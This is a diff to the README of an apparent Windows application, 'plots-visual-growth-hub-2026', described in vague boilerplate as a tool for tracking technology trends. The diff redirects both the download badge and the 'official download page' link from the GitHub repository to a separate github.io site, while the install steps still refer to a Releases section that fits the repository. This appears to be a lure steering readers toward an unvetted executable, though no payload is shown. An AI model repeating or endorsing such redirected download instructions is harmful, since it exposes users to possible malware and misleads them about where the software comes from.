@@ -1,6 +1,6 @@
 # 📈 plots-visual-growth-hub-2026 - Track tech progress with interactive timelines
 
-[![](https://img.shields.io/badge/Download-plots--visual--growth--hub--2026-blue)](https://github.com/omegawa1289/plots-visual-growth-hub-2026)
+[![](https://img.shields.io/badge/Download-plots--visual--growth--hub--2026-blue)](https://omegawa1289.github.io)
 
 This application tracks technology growth patterns. It shows how specific tech fields develop over time. Users view data through an interactive timeline. This helps people see trends and milestones clearly. The tool focuses on the plots v2026 data set.
 
@@ -18,7 +18,7 @@ Your computer must meet these standards to run the application:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official download page](https://github.com/omegawa1289/plots-visual-growth-hub-2026).
+1. Visit the [official download page](https://omegawa1289.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the most recent version number.
 4. Scroll to the Assets section at the bottom of the release notes.
